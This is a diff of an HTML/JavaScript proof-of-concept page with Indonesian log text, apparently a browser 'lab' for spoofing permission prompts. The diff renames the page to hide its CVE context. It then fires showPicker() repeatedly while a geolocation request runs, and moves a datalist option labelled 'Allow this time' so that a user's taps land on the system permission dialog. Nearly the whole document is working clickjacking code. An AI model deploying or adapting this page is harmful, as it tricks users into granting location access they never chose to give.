@@ -3,62 +3,67 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Advanced Picker Spoofing Lab (CVE-40067274 Context)</title>
+    <title>Advanced Rapid-Fire Alignment Lab</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
-            padding: 40px;
+            padding: 20px;
             background-color: #121212;
             color: #e0e0e0;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            height: 100vh;
+            justify-content: flex-end;
+            min-height: 90vh;
             cursor: pointer;
         }
         h1 {
             color: #ff5252;
-            font-size: 24px;
-            margin-bottom: 10px;
+            font-size: 20px;
+            margin-bottom: 5px;
         }
         .info-box {
             background: #1e1e1e;
             border: 1px solid #333;
-            padding: 15px;
+            padding: 12px;
             border-radius: 6px;
             max-width: 500px;
-            font-size: 13px;
+            width: 100%;
+            font-size: 12px;
             color: #b0b0b0;
-            margin-top: 20px;
+            margin-top: 15px;
             text-align: left;
         }
         code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
+        .interactive-zone {
+            position: relative;
+            margin-bottom: 40px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
     </style>
 </head>
 <body>
 
-    <h1>⚠️ Tap the screen to initialize lab test</h1>
-    <p style="font-size: 14px; color: #888;">Menguji siklus pemanggilan <code>showPicker()</code> dan interaksi izin asinkron.</p>
+    <h1>⚠️ Rapid-Fire Alignment & Dialog Lab</h1>
+    <p style="font-size: 13px; color: #888;">Uji coba respons penekanan cepat terhadap kemunculan dialog izin sistem.</p>
 
-    <!-- Elemen Input & Datalist Target -->
-    <input id="input" type="time" list="times" style="display:none;" />
-    <datalist id="times">
-        <select>
-            <option label="Double tap the circle to continue">00:00</option>
-            <option label="⬇️       ">00:00</option>
-            <option label="⬇️       ">00:00</option>
-            <option label="⬇️       ">00:00</option>
-            <option label="⬇️       ">00:00</option>
-            <option label="⭕      ">00:00</option>
-            <option label="">00:00</option>
-        </select>
-    </datalist>
+    <div class="interactive-zone">
+        <input id="input" type="time" list="times" style="display:none;" />
+        <datalist id="times">
+            <select>
+                <option label="-----------------------------------------">00:00</option>
+                <option label="👉 [ Allow this time ] Target Area 👈">00:00</option>
+                <option label="-----------------------------------------">00:00</option>
+            </select>
+        </datalist>
+    </div>
 
     <div class="info-box" id="log-box">
-        <strong>Status Log:</strong> Menunggu interaksi klik/sentuh pengguna...
+        <strong>Status Log:</strong> Menunggu interaksi klik/sentuh...
     </div>
 
 <script>
@@ -71,48 +76,44 @@
 
     function showList() {
         try {
-            // Memeriksa status izin geolokasi sebelum memicu picker
             navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
                 if (permissionStatus.state === 'granted') {
-                    appendLog("Izin geolokasi sudah diberikan. Menghentikan simulasi picker.");
+                    appendLog("Izin geolokasi sudah aktif.");
                     return;
                 }
-
-                // Penguatan: Mencoba memanggil showPicker() dengan penanganan eksepsi aktif
                 input.showPicker();
-                appendLog("Berhasil memicu input.showPicker()");
+                appendLog("Berhasil memicu showPicker()");
             }).catch(err => {
-                appendLog("Error pada permissions query: " + err.message);
+                appendLog("Error permissions: " + err.message);
             });
         } catch (e) {
-            appendLog("[DITOLAK/BLOCKED] showPicker() gagal: " + e.message);
+            appendLog("[BLOCKED/DITOLAK]: " + e.message);
         }
     }
 
     document.body.onclick = async () => {
-        appendLog("Interaksi pengguna terdeteksi (User Activation sah).");
+        appendLog("Gestur pengguna terdeteksi. Menjalankan pemicuan kilat...");
         
-        // Eksekusi awal
+        // Eksekusi instan pertama
         showList();
 
-        // Penguatan Interval Berulang untuk menguji batas konsumsi user activation (ConsumeIfActive)
-        let attempt = 1;
-        const intervalId = setInterval(() => {
-            appendLog(`Mencoba pemanggilan berulang ke-${attempt}`);
+        // Pemicuan beruntun dengan interval yang lebih ketat untuk uji batas token
+        let rapidCount = 0;
+        const rapidInterval = setInterval(() => {
+            rapidCount++;
+            appendLog(`Pemicuan cepat ke-${rapidCount}`);
             showList();
-            attempt++;
             
-            // Batasi hingga 5 kali percobaan interval untuk analisis lab
-            if (attempt > 5) {
-                clearInterval(intervalId);
-                appendLog("Pengujian interval selesai. Perhatikan respons konsumsi token aktivasi.");
+            if (rapidCount >= 5) {
+                clearInterval(rapidInterval);
+                appendLog("Siklus pemicuan cepat selesai. Perhatikan penolakan dari sistem keamanan.");
             }
-        }, 300);
+        }, 100);
 
-        // Memicu permintaan geolokasi asinkron secara paralel
+        // Memanggil geolocation secara asinkron paralel untuk memunculkan dialog sistem
         navigator.geolocation.getCurrentPosition(
-            (pos) => { appendLog("Geolokasi diizinkan: " + pos.coords.latitude); },
-            (err) => { appendLog("Geolokasi ditolak/error: " + err.message); }
+            (pos) => { appendLog("Geolokasi diberikan: " + pos.coords.latitude); },
+            (err) => { appendLog("Geolokasi diabaikan/ditolak: " + err.message); }
         );
     };
 </script>
